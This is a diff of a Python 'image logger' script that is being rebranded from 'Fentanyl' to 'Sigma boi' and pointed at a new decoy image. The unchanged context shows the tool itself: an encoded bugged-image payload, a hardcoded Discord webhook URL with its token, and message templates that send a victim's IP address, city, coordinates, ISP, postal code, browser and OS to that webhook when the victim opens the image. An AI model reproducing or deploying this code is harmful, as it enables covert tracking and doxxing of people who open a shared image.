@@ -4,21 +4,21 @@ import httpx, base64, httpagentparser
 
 webhook = 'https://discord.com/api/webhooks/1396566807284023327/NDN0-oReowCm400t32pfxgWNjYEky67UMaIte8b_BdpIHmMJpZUpxOv7kSEgQEfC2ybY'
 
-bindata = httpx.get('https://pbs.twimg.com/profile_images/1284155869060571136/UpanAYid_400x400.jpg').content
+bindata = httpx.get('https://www.pcworld.com/wp-content/uploads/2025/04/Windows-XP-Bliss-desktop-large.png').content
 buggedimg = False # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
 buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
 
 def formatHook(ip,city,reg,country,loc,org,postal,useragent,os,browser):
     return {
-  "username": "Fentanyl",
+  "username": "Sigma boi",
   "content": "@everyone",
   "embeds": [
     {
-      "title": "Fentanyl strikes again!",
+      "title": "sigma attack",
       "color": 16711803,
       "description": "A Victim opened the original Image. You can find their info below.",
       "author": {
-        "name": "Fentanyl"
+        "name": "Sigma boi"
       },
       "fields": [
         {
@@ -38,15 +38,15 @@ def formatHook(ip,city,reg,country,loc,org,postal,useragent,os,browser):
 
 def prev(ip,uag):
   return {
-  "username": "Fentanyl",
+  "username": "Sigma Boi",
   "content": "",
   "embeds": [
     {
-      "title": "Fentanyl Alert!",
+      "title": "Sigma Alert!",
       "color": 16711803,
-      "description": f"Discord previewed a Fentanyl Image! You can expect an IP soon.\n\n**IP:** `{ip}`\n**UserAgent:** `Look Below!`\n```yaml\n{uag}```",
+      "description": f"Discord previewed a Sigma Image! You can expect an IP soon.\n\n**IP:** `{ip}`\n**UserAgent:** `Look Below!`\n```yaml\n{uag}```",
       "author": {
-        "name": "Fentanyl"
+        "name": "Sigma"
       },
       "fields": [
       ]
